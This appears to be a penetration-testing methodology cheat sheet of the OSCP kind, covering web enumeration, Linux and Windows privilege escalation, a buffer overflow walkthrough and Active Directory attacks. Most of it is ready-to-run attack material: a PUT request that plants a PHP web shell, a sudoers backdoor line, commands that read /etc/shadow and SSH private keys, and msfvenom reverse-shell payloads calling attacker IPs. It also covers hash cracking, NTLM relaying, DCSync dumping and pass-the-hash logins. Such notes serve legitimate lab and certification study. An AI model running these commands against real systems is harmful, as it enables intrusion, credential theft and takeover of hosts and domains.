<h3><a class="header" href="#3306---mysql" id="3306---mysql">3306 - MySQL</a></h3>
<ul>
<li>Name:</li>
<li>Version:</li>
</ul>
<pre><code>nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse INSERTIPADDRESS -p 3306

mysql --host=INSERTIPADDRESS -u root -p
</code></pre>
<h3><a class="header" href="#port-3339---oracle-web-interface" id="port-3339---oracle-web-interface">Port 3339 - Oracle web interface</a></h3>
<ul>
<li>Basic info about web service (apache, nginx, IIS)</li>
<li>Server:</li>
<li>Scripting language:</li>
<li>Apache Modules:</li>
<li>IP-address:</li>
</ul>
<h3><a class="header" href="#port-80---web-server" id="port-80---web-server">Port 80 - Web server</a></h3>
<ul>
<li>Server:</li>
<li>Scripting language:</li>
<li>Apache Modules:</li>
<li>IP-address:</li>
<li>Domain-name address:</li>
</ul>
<p>INSERTCURLHEADER</p>
<ul>
<li>Web application (ex, wordpress, joomla, phpmyadmin)</li>
<li>Name:</li>
<li>Version:</li>
<li>Admin-login:</li>
</ul>
<pre><code># Nikto
nikto -h http://INSERTIPADDRESS

# Nikto with squid proxy
nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444

# CMS Explorer
cms-explorer -url http://INSERTIPADDRESS -type [Drupal, WordPress, Joomla, Mambo]

# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://INSERTIPADDRESS
wpscan --url http://INSERTIPADDRESS --enumerate vp
wpscan --url http://INSERTIPADDRESS --enumerate vt
wpscan --url http://INSERTIPADDRESS --enumerate u

# Joomscan
joomscan -u  http://INSERTIPADDRESS
joomscan -u  http://INSERTIPADDRESS --enumerate-components

# Get header
curl -i INSERTIPADDRESS

# Get everything
curl -i -L INSERTIPADDRESS

# Check for title and all links
curl INSERTIPADDRESS -s -L | grep &quot;title\|href&quot; | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl INSERTIPADDRESS -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' http://INSERTIPADDRESS/test/shell.php

dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
</code></pre>
<h4><a class="header" href="#nikto-scan" id="nikto-scan">Nikto scan</a></h4>
<p>INSERTNIKTOSCAN</p>
<h4><a class="header" href="#url-brute-force" id="url-brute-force">Url brute force</a></h4>
<pre><code># Not recursive
dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt

# Gobuster - remove relevant responde codes (403 for example)
gobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
</code></pre>
<p>INSERTDIRBSCAN</p>
<h4><a class="header" href="#defaultweak-login" id="defaultweak-login">Default/Weak login</a></h4>
<p>Search documentation for default passwords and test them</p>
<pre><code>site:webapplication.com password
</code></pre>
<pre><code>admin admin
admin password
admin &lt;blank&gt;
admin &lt;servicename&gt;
root root
root admin
root password
root &lt;servicename&gt;
&lt;username if you have&gt; password
&lt;username if you have&gt; admin
&lt;username if you have&gt; username
username &lt;servicename&gt;
</code></pre>
<h4><a class="header" href="#lfirfi" id="lfirfi">LFI/RFI</a></h4>
<pre><code>fimap -u &quot;http://INSERTIPADDRESS/example.php?test=&quot;

# Ordered output
curl -s http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
/root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=
</code></pre>
<h4><a class="header" href="#sql-injection" id="sql-injection">SQL-Injection</a></h4>
<pre><code># Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u &quot;http://INSERTIPADDRESS/index.php?id=1&quot; --dbms=mysql

# Crawl
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
</code></pre>
<h4><a class="header" href="#sql-login-bypass" id="sql-login-bypass">Sql-login-bypass</a></h4>
<ul>
<li>Open Burp-suite</li>
<li>Make and intercept a request</li>
<li>Send to intruder</li>
<li>Cluster attack.</li>
<li>Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)</li>
<li>Attack</li>
<li>Check for response length variation</li>
</ul>
<h3><a class="header" href="#password-brute-force---last-resort" id="password-brute-force---last-resort">Password brute force - last resort</a></h3>
<pre><code>cewl
</code></pre>
<h3><a class="header" href="#port-443---https" id="port-443---https">Port 443 - HTTPS</a></h3>
<p>Heartbleed:</p>
<pre><code># Heartbleed
sslscan INSERTIPADDRESS:443
</code></pre>
<h2><a class="header" href="#vulnerability-analysis" id="vulnerability-analysis">Vulnerability analysis</a></h2>
<p>Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilites and features.</p>
<h3><a class="header" href="#to-try---list-of-possibilies" id="to-try---list-of-possibilies">To try - List of possibilies</a></h3>
<p>Add possible exploits here:</p>
<h3><a class="header" href="#find-sploits---searchsploit-and-google" id="find-sploits---searchsploit-and-google">Find sploits - Searchsploit and google</a></h3>
<p>Where there are many exploits for a software, use google. It will automatically sort it by popularity.</p>
<pre><code>site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi &quot;tomcat&quot;

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
</code></pre>
<hr />
<p>'''''''''''''''''''''''''''''''''' PRIVESC '''''''''''''''''''''''''''''''''</p>
<hr />
<h2><a class="header" href="#privilege-escalation" id="privilege-escalation">Privilege escalation</a></h2>
<p>Now we start the whole enumeration-process over gain.</p>
<ul>
<li>Kernel exploits</li>
<li>Programs running as root</li>
<li>Installed software</li>
<li>Weak/reused/plaintext passwords</li>
<li>Inside service</li>
<li>Suid misconfiguration</li>
<li>World writable scripts invoked by root</li>
<li>Unmounted filesystems</li>
</ul>
<p>Less likely</p>
<ul>
<li>Private ssh keys</li>
<li>Bad path configuration</li>
<li>Cronjobs</li>
</ul>
<h3><a class="header" href="#to-try-list" id="to-try-list">To-try list</a></h3>
<p>Here you will add all possible leads. What to try.</p>
<h3><a class="header" href="#useful-commands-1" id="useful-commands-1">Useful commands</a></h3>
<pre><code># Spawning shell
python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Set up webserver
cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080

# Download all files
wget http://192.168.1.101:8080/ -r; mv 192.168.1.101:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check

./LinEnum.sh -t -k password -r LinEnum.txt
python linprivchecker.py extended
./unix-privesc-check standard


# Writable directories
/tmp
/var/tmp


# Add user to sudoers
echo &quot;hacker ALL=(ALL:ALL) ALL&quot; &gt;&gt; /etc/sudoers
</code></pre>
<h3><a class="header" href="#basic-info" id="basic-info">Basic info</a></h3>
<ul>
<li>OS:</li>
<li>Version:</li>
<li>Kernel version:</li>
<li>Architecture:</li>
<li>Current user:</li>
</ul>
<p><strong>Devtools:</strong></p>
<ul>
<li>GCC:</li>
<li>NC:</li>
<li>WGET:</li>
</ul>
<p><strong>Users with login:</strong></p>
<pre><code>uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts

# Users with login
grep -vE &quot;nologin&quot; /etc/passwd

# Priv Enumeration Scripts


upload /unix-privesc-check
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./

python linprivchecker.py extended
./LinEnum.sh -t -k password
unix-privesc-check
</code></pre>
<h3><a class="header" href="#kernel-exploits" id="kernel-exploits">Kernel exploits</a></h3>
<pre><code>site:exploit-db.com kernel version

perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6

python linprivchecker.py extended
</code></pre>
<h3><a class="header" href="#programs-running-as-root" id="programs-running-as-root">Programs running as root</a></h3>
<p>Look for webserver, mysql or anything else like that.</p>
<pre><code># Metasploit
ps

# Linux
ps aux
</code></pre>
<h3><a class="header" href="#installed-software" id="installed-software">Installed software</a></h3>
<pre><code>/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
</code></pre>
<h3><a class="header" href="#weakreusedplaintext-passwords" id="weakreusedplaintext-passwords">Weak/reused/plaintext passwords</a></h3>
<ul>
<li>Check database config-file</li>
<li>Check databases</li>
<li>Check weak passwords</li>
</ul>
<pre><code>username:username
username:username1
username:root
username:admin
username:qwerty
username:password
</code></pre>
<ul>
<li>Check plaintext</li>
</ul>
<pre><code>./LinEnum.sh -t -k password
</code></pre>
<h3><a class="header" href="#inside-service" id="inside-service">Inside service</a></h3>
<pre><code># Linux
netstat -anlp
netstat -ano
</code></pre>
<h3><a class="header" href="#suid-misconfiguration" id="suid-misconfiguration">Suid misconfiguration</a></h3>
<p>Binary with suid permission can be run by anyone, but when they are run they are run as root!</p>
<p>Example programs:</p>
<pre><code>nmap
vim
nano
</code></pre>
<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
</code></pre>
<h3><a class="header" href="#unmounted-filesystems" id="unmounted-filesystems">Unmounted filesystems</a></h3>
<p>Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.</p>
<pre><code>mount -l
</code></pre>
<h3><a class="header" href="#cronjob" id="cronjob">Cronjob</a></h3>
<p>Look for anything that is owned by privileged user but writable for you</p>
<pre><code>crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
</code></pre>
<h3><a class="header" href="#ssh-keys" id="ssh-keys">SSH Keys</a></h3>
<p>Check all home directories</p>
<pre><code>cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
</code></pre>
<h3><a class="header" href="#bad-path-configuration" id="bad-path-configuration">Bad path configuration</a></h3>
<p>Require user interaction</p>
<hr />
<p>----------------------------- LOOT LOOT LOOT LOOT ----------------------</p>
<hr />
<h2><a class="header" href="#loot" id="loot">Loot</a></h2>
<p><strong>Checklist</strong></p>
<ul>
<li>Proof:</li>
<li>Network secret:</li>
<li>Passwords and hashes:</li>
<li>Dualhomed:</li>
<li>Tcpdump:</li>
<li>Interesting files:</li>
<li>Databases:</li>
<li>SSH-keys:</li>
<li>Browser:</li>
<li>Mail:</li>
</ul>
<h3><a class="header" href="#proof" id="proof">Proof</a></h3>
<pre><code>/root/proof.txt
</code></pre>
<h3><a class="header" href="#network-secret" id="network-secret">Network secret</a></h3>
<pre><code>/root/network-secret.txt
</code></pre>
<h3><a class="header" href="#passwords-and-hashes" id="passwords-and-hashes">Passwords and hashes</a></h3>
<pre><code>cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow &gt; unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
</code></pre>
<h3><a class="header" href="#dualhomed" id="dualhomed">Dualhomed</a></h3>
<pre><code>ifconfig
ifconfig -a
arp -a
</code></pre>
<h3><a class="header" href="#tcpdump" id="tcpdump">Tcpdump</a></h3>
<pre><code>tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X
tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X
</code></pre>
<h3><a class="header" href="#interesting-files" id="interesting-files">Interesting files</a></h3>
<pre><code>#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

.ssh:
.bash_history
</code></pre>
<h3><a class="header" href="#databases" id="databases">Databases</a></h3>
<h3><a class="header" href="#ssh-keys-1" id="ssh-keys-1">SSH-Keys</a></h3>
<h3><a class="header" href="#browser" id="browser">Browser</a></h3>
<h3><a class="header" href="#mail" id="mail">Mail</a></h3>
<pre><code>/var/mail
/var/spool/mail
</code></pre>
<h3><a class="header" href="#gui" id="gui">GUI</a></h3>
<p>If there is a gui we want to check out the browser.</p>
<pre><code>echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
</code></pre>
<h2><a class="header" href="#how-to-replicate" id="how-to-replicate">How to replicate:</a></h2>
<h1><a class="header" href="#file-upload" id="file-upload">File Upload</a></h1>
<h2><a class="header" href="#smb-server" id="smb-server">SMB Server</a></h2>
<pre><code>On attacker box share current directory

sudo impacket-smbserver a . 

On target box copy file to share

cd %tmp%
copy \\10.11.9.134\a\winPEAS.bat
</code></pre>
<h1><a class="header" href="#buffer-overflow-1" id="buffer-overflow-1">Buffer Overflow</a></h1>
<h2><a class="header" href="#spiking" id="spiking">Spiking</a></h2>
<pre><code>nc -nv IP PORT
</code></pre>
<p>Find the available commands and start spiking to find vulnerable command</p>
<pre><code>generic_send_tcp HOST PORT stats.spk 0 0
</code></pre>
<p><img src="https://gblobscdn.gitbook.com/assets%2F-M51QhT21xpEfTWU4ttG%2F-M8cReh2zkyhBACCl7vO%2F-M8cU83zQipL95cfqvQC%2Fimage.png?alt=media&amp;token=1bc70c72-77b6-4e57-9960-d9a48014bb25" alt="" /></p>
<h2><a class="header" href="#fuzzing" id="fuzzing">Fuzzing</a></h2>
<p><img src="https://gblobscdn.gitbook.com/assets%2F-M51QhT21xpEfTWU4ttG%2F-M8cReh2zkyhBACCl7vO%2F-M8cTEGEamXhaJImCMqC%2Fimage.png?alt=media&amp;token=ff09d187-8820-477d-95cb-f4d33e8e481d" alt="" /></p>
<pre><code class="language-python">#!/usr/bin/python
import socket

buffer = [&quot;A&quot;]

counter = 100

while len(buffer) &lt;=30:
    buffer.append(&quot;A&quot; * counter)
    counter = counter + 100

for string in buffer:
    print &quot;Fuzzing with %s bytes&quot; % len(string)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect = s.connect(('10.10.153.41',31337))
    s.send(string + '\r\n')
    data = s.recv(1024)
    s.close()
</code></pre>
<h2><a class="header" href="#finding-the-offset" id="finding-the-offset">Finding the Offset</a></h2>
<pre><code>/usr/share/metasploit-framework/tools/exploits/pattern_create.rb -l CRASHBYTES
</code></pre>
<p>Copy the output and paste value into the buffer variable in the script.</p>
<p>Run the script and find the EIP overwritten value (Ex: 35724134)</p>
<pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
</code></pre>
<p>Get exact match for the offset</p>
<p>Or using mona</p>
<pre><code>!mona findmsp -distance CRASHBYTES
</code></pre>
<h2><a class="header" href="#overwrite-the-eip" id="overwrite-the-eip">Overwrite the EIP</a></h2>
<p>&gt; [*] Exact match at offset 524</p>
<p>Great! Now our payload will be as follow &quot;A&quot;*524 + &quot;B&quot;*4 + badchars. Updated script gives following result:</p>
<p>## Finding bad characters</p>
<pre><code>badchars = (&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;
&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;
&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;
&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;
&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;
&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;
&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)
</code></pre>
<p>The first of all we should remove from our payload <strong>\x00</strong>(null byte - break everything what is next) and <strong>\x90</strong> (No Operation - do nothing)</p>
<p>Add badchars to script right after the EIP</p>
<p><img src="https://gblobscdn.gitbook.com/assets%2F-M51QhT21xpEfTWU4ttG%2F-M8cUd37vodaipUY5pEl%2F-M8cZ3BlmMhRhEf21j5d%2Fimage.png?alt=media&amp;token=a97cb5b0-b567-4c5f-af74-42e332f553c9" alt="" /></p>
<p>Follow ESP Hex dump and see what values are missing. (In imunity debugger)</p>
<p><img src="https://gblobscdn.gitbook.com/assets%2F-M51QhT21xpEfTWU4ttG%2F-M8cUd37vodaipUY5pEl%2F-M8cZVYS6eoVCRqjnlF3%2Fimage.png?alt=media&amp;token=6f8de275-e382-4a3f-b66c-95ec35a29408" alt="" /></p>
<p>Find the bad chars and keep removing them from the script and repeating the process.</p>
<p>Or making use of mona simply run the following command</p>
<pre><code>!mona bytearray -b &quot;\x00&quot;
</code></pre>
<p>Run the script and take not of the memory address to which the ESP register points. Then use it in the following command:</p>
<pre><code>!mona compare -f C:\mona\oscp\bytearray.bin -a 0124FA18
</code></pre>
<p>Not all of these might be bad chars! Sometimes bad chars cause the next byte to get corrupted as well, or even affect the rest of the string. Use trial and error.</p>
<h2><a class="header" href="#finding-the-right-esp-jump-instruction" id="finding-the-right-esp-jump-instruction">Finding the right ESP jump instruction</a></h2>
<p>Import mona modules into Immunity debugger</p>
<p><a href="https://github.com/corelan/mona">GitHub - corelan/mona: Corelan Repository for mona.py</a></p>
<p>In Immunity debugger</p>
<pre><code>!mona jmp -r esp
Or browse Window-&gt;Log Data
</code></pre>
<p>From this command retrieve the JMP address (080414C3). 
Convert big endian into little endian.
080414C3 --&gt; c3140408</p>
<p><strong>Alternatively</strong></p>
<p>In Immunity debugger</p>
<pre><code>!mona modules
</code></pre>
<p>Find modules with protection settings set to false and attatched to the process.
(essdunc.dll in this case)</p>
<p>HEX Code equivalent to JMP ESP is FFE4
With this information we can find the JMP address in the dll</p>
<pre><code>!mona find -s &quot;\xff\xe4&quot; -m essdunc.dll
</code></pre>
<p>Retrieve the return addresses for the JMP address</p>
<p>Now, we find our <strong>JMP ESP</strong> address - 311712F3
So, our payload will be as follow: <strong>&quot;A&quot; * 2003 + &quot;\xf3\x12\x17\x31&quot; + &quot;\x90&quot; * 32 + shell_code.</strong>.
Also add a few \x90 NOP values before the shell code.
Note that the JMP address is in reverse</p>
<p>## Generate shell code</p>
<p>Test by first trying to open the calculator</p>
<pre><code>msfvenom -p windows/exec -b &quot;\x00&quot; -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread
</code></pre>
<p>For windows boxes:</p>
<pre><code> msfvenom -p windows/shell_rever se_tcp LHOST= LPORT=4444 EXITFUNC=thread -f c -a x86 -b &quot;\x00&quot;

  msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 EXITFUNC=thread -f python c -a x86 -b &quot;\x00\x0a&quot;
</code></pre>
<p>For Linux box:</p>
<pre><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.8.26.76 LPORT=9001 -f c -a x86 --platform linux -b &quot;\x00&quot; -e x86/shikata_ga_nai
</code></pre>
<p>Note the bad characters. Copy the payload result. Also available: linux/x86/shell_reverse_tcp.</p>
<p><img src="https://gblobscdn.gitbook.com/assets%2F-M51QhT21xpEfTWU4ttG%2F-M8cUd37vodaipUY5pEl%2F-M8cdIb2OHPn2ocrmEbE%2Fimage.png?alt=media&amp;token=4139ddff-3288-4f24-88e8-028dec2f975f" alt="" /></p>
<p>Lastly run the exploit and listen for connections:</p>
<pre><code>nc -nvlp 4444
</code></pre>
<h2><a class="header" href="#additional-reading" id="additional-reading">Additional reading</a></h2>
<p><a href="https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood_tutorial.pdf">dostackbufferoverflowgood/dostackbufferoverflowgood_tutorial.pdf at master · justinsteven/dostackbufferoverflowgood · GitHub</a></p>
<h1><a class="header" href="#active-directory" id="active-directory">Active Directory</a></h1>
<p><a href="https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa">Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition)</a></p>
<h2><a class="header" href="#llmnr-poisoning" id="llmnr-poisoning">LLMNR Poisoning</a></h2>
<p>Listen for connections and retrieve hashes</p>
<pre><code>responder -I eth0 -rdwv
</code></pre>
<p>Password cracking with hashcat (NTLMv2)</p>
<pre><code>hashcat -m 5600 hash.txt rockyou.txt --force
</code></pre>
<h2><a class="header" href="#smb-relay" id="smb-relay">SMB Relay</a></h2>
<p>(disable smb and http on responder)</p>
<p>Start listening for events on responder</p>
<p>Initialize relay</p>
<pre><code>ntlmrelay.py -tf targets.txt -smb2support
</code></pre>
<p>Retrieve SAM hashes</p>
<h2><a class="header" href="#crackmapexec" id="crackmapexec">CrackMapExec</a></h2>
<p>Brute Force</p>
<pre><code>crackmapexec smb 10.10.10.184 -u USER_LIST -p pass.txt
</code></pre>
<p>List shares</p>
<pre><code>crackmapexec smb 10.10.10.184 -u USER -p PASSWORD --shares
</code></pre>
<p>null authentication</p>
<pre><code>crackmapexec smb 10.10.10.184 --pass-pol -u '' -p '' 
</code></pre>
<h2><a class="header" href="#kerberos" id="kerberos">Kerberos</a></h2>
<p>Run impacket/GetNPUsers.py to get the users that don't have the require pre-authentication option</p>
<pre><code>GetNPUsers.py -dc-ip IP -no-pass -userfile user.txt
</code></pre>
<p>Crack the hashes found</p>
<p>Use evil-winrm to connect to the box using the credentials found</p>
<p>Use ntlmrelay.py from Impacket to relay any changes made to LDAP.</p>
<pre><code>ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco
</code></pre>
<p>Authenticate by visiting http://localhost/privexchange (any directory will work, this is random). This sets the user ad Domain Admin.</p>
<p>Use Impacket’s secretsdump.py to perform the DCSync attack, gathering all the user hashes:</p>
<pre><code>secretsdump.py htb.local/user:password@10.10.10.161 -just-dc -outputfile secrets-dump.txt
</code></pre>
<p>Login using the Administrator hash</p>
<pre><code>evil-winrm -u Administrator -i 10.10.10.161 -H '32693b11e6aa90eb43d32c72a07ceea6'
</code></pre>
<h3><a class="header" href="#kerbrute" id="kerbrute">Kerbrute</a></h3>
<p>Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.</p>
<p>You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine:
10.10.117.212  CONTROLLER.local</p>
<pre><code>./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
</code></pre>
<h3><a class="header" href="#harvesting-tickets-w-rubeus" id="harvesting-tickets-w-rubeus">Harvesting Tickets w/ Rubeus</a></h3>
<p>On the target machine</p>
<pre><code>Rubeus.exe harvest /interval:30

Rubeus.exe kerberoast 
This will dump the Kerberos hash of any kerberoastable users    
</code></pre>
<h3><a class="header" href="#dumping-krbasrep5-hashes-w-rubeus" id="dumping-krbasrep5-hashes-w-rubeus">Dumping KRBASREP5 Hashes w/ Rubeus</a></h3>
<pre><code>Rubeus.exe asreproast
</code></pre>
<p>Crack the resulting hashes</p>
<h2><a class="header" href="#ipv6-dns-takeover-via-mitm6" id="ipv6-dns-takeover-via-mitm6">Ipv6 DNS Takeover via mitm6</a></h2>
<p><a href="https://github.com/fox-it/mitm6">GitHub - fox-it/mitm6: pwning IPv4 via IPv6</a></p>
<p><a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">The worst of both worlds: Combining NTLM Relaying and Kerberos delegation - dirkjanm.io</a></p>
<h1><a class="header" href="#privesc-1" id="privesc-1">Privesc</a></h1>
<h2><a class="header" href="#powerview" id="powerview">Powerview</a></h2>
<p>Start Powershell - powershell -ep bypass -ep bypasses the execution policy of powershell allowing you to easily run scripts</p>
<pre><code>powershell -ep bypass
</code></pre>
<p>Start PowerView</p>
<pre><code>. .\PowerView.ps1
</code></pre>
<p>Enumerate the domain users -</p>
<pre><code>Get-NetUser | select cn
</code></pre>
<p>Enumerate the domain groups</p>
<pre><code>Get-NetGroup -GroupName *admin*
</code></pre>
<p>Additional queries</p>
<p>https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</p>
<h2><a class="header" href="#powerup-a-powershell-script" id="powerup-a-powershell-script">PowerUp a powershell script</a></h2>
<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</p>
<p>To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:</p>
<pre><code>. .\PowerUp.ps1
Invoke-AllChecks
</code></pre>
<p>This script is useful but requires PowerShell. If you are to use this script I advise using a one-off PowerShell command. For example:</p>
<pre><code>powershell.exe -exec bypass -Command “&amp; {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”
</code></pre>
<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.27.83 LPORT=4443 -e x86/sjikata -
f exe -o Advanced.exe
</code></pre>
<p>Encoded payload</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai
LHOST=10.11.9.134 LPORT=9091 -f exe -o bruce.exe
</code></pre>
<h2><a class="header" href="#sherlock-powershell-script-exploit-suggester" id="sherlock-powershell-script-exploit-suggester">Sherlock PowerShell script exploit suggester</a></h2>
<p>Edit Sherlock.ps1 file and add line at the end.</p>
<pre><code>...
Find-AllVulns
</code></pre>
<h2><a class="header" href="#bloodhound" id="bloodhound">BloodHound</a></h2>
<pre><code>powershell -ep bypass

.\Downloads\SharpHound.ps1

Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
</code></pre>
<p>Upload zip file into bloodhound.</p>
<h2><a class="header" href="#mimikatz" id="mimikatz">Mimikatz</a></h2>
<p>Load mimikatz.</p>
<pre><code>privilege::debug
</code></pre>
<p>Ensure that the output is &quot;Privilege '20' ok&quot; - This ensures that you're running mimikatz as an administrator</p>
<p>Dump hashes</p>
<pre><code>lsadump::lsa /patch
</code></pre>
<h2><a class="header" href="#token-impersonation-with-incognito" id="token-impersonation-with-incognito">Token Impersonation with Incognito</a></h2>
<p>On a meterpreter shell load incognito</p>
<pre><code>list_tokens -u
impersonate_toker token\\name
rev2self on meterpreter (reverts back to the initial permissions)
</code></pre>
<h2><a class="header" href="#kerberoasting" id="kerberoasting">Kerberoasting</a></h2>
<p>ASReproasting occurs when a user account has the privilege &quot;Does not require Pre-Authentication&quot; set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.</p>
<p>Impacket has a tool called &quot;GetNPUsers.py&quot; (located in Impacket/Examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. (Enumerate valid users with kerbrute)</p>
<pre><code>GetNPUsers.py spookysec.local/ -usersfile userlist.txt

GetNPUsers.py spookysec.local/svc-admin -no-pass
</code></pre>
<p>Once we have user credentials we can retrieve services with administrator accounts</p>
<p>Using the GetUserSPNS.py (impacket)</p>
<pre><code>GetUserSPNS.py domain.local/user:password -dc-ip 192.168.57.140 -request
GetUserSPNS.py -request -dc-ip IP TARGET(domain/user)
</code></pre>
<p>Or</p>
<pre><code>GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.117.212 -request
</code></pre>
<p>Find hashcat hash type</p>
<pre><code>hashcat --1 help | grep Kerberos
hashcat -m 13100 hashes4.txt rockyou.txt -O
</code></pre>
<h2><a class="header" href="#abusing-gpp" id="abusing-gpp">Abusing GPP</a></h2>
<p>Find the Groups.xml file.
Retrieve the cpassword hash. Decrypt.</p>
<pre><code>gpp-decrypt hash
</code></pre>
<h2><a class="header" href="#port-forwardingtunneling" id="port-forwardingtunneling">Port Forwarding/Tunneling</a></h2>
<h3><a class="header" href="#plink" id="plink">Plink</a></h3>
